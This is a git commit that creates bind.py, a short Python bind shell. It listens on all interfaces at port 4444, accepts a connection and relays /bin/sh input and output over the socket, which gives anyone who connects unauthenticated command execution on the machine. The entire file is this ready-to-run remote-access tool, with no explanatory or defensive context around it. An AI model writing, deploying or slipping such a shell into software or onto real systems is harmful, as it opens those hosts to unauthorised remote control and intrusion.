e7b7311cb9dc204c3145f735ca54acb993f00bf8
omerfarukkykc <54690370+omerfarukkykc@users.noreply.github.com>
2023-10-10 20:51:51 +0300

    Create bind.py

---
+++ bind.py
@@ -0,0 +1,38 @@
+import subprocess
+import socket
+import os
+import threading
+import time
+
+HOST = '0.0.0.0'
+PORT = 4444
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.bind((HOST, PORT))
+
+s.listen(1)
+print(f"[*] Listening on {HOST}:{PORT}")
+
+conn, addr = s.accept()
+print(f"[*] Connection from: {addr[0]}:{addr[1]}")
+
+proc = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+
+def read_from_subprocess_and_write_to_socket(proc, conn):
+    while True:
+        output = proc.stdout.read(1)
+        if not output:
+            break
+        conn.send(output)
+
+def read_from_socket_and_write_to_subprocess(conn, proc):
+    while True:
+        data = conn.recv(1024)
+        if not data:
+            break
+        proc.stdin.write(data)
+        proc.stdin.flush()
+
+threading.Thread(target=read_from_subprocess_and_write_to_socket, args=(proc, conn)).start()
+threading.Thread(target=read_from_socket_and_write_to_subprocess, args=(conn, proc)).start()
